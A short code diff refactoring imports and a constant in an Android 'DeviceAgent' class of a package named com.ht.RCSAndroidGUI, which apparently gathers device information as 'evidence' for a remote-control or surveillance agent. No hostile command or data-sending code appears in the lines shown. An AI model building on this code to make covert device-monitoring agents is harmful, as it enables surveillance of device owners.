@@ -24,10 +24,10 @@ import android.graphics.drawable.Drawable;
 import android.util.Log;
 
 import com.ht.RCSAndroidGUI.Device;
-import com.ht.RCSAndroidGUI.Evidence;
-import com.ht.RCSAndroidGUI.EvidenceType;
 import com.ht.RCSAndroidGUI.LogR;
 import com.ht.RCSAndroidGUI.Status;
+import com.ht.RCSAndroidGUI.evidence.Evidence;
+import com.ht.RCSAndroidGUI.evidence.EvidenceType;
 import com.ht.RCSAndroidGUI.utils.Utils;
 import com.ht.RCSAndroidGUI.utils.WChar;
 
@@ -134,7 +134,7 @@ public class DeviceAgent extends AgentBase {
 
 		final String content = sb.toString();
 
-		final int ev = Evidence.convertTypeEvidence(Agent.AGENT_DEVICE);
+		final int ev = Evidence.convertTypeEvidence(AgentConf.AGENT_DEVICE);
 
 		// atomic log
 		// LogR log = new LogR(EvidenceType.DEVICE, LogR.LOG_PRI_STD, null,
